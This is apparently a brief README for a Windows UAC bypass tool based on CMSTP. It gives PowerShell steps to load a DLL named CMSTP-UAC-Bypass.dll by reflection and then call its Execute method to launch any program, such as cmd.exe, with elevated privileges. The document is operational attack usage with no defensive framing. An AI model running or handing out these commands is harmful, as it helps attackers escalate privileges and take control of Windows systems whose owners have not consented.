# Execute Methods:

1. Open PowerShell
2. Execute this command "[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))"
3. Execute any command you want 

Example: [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe")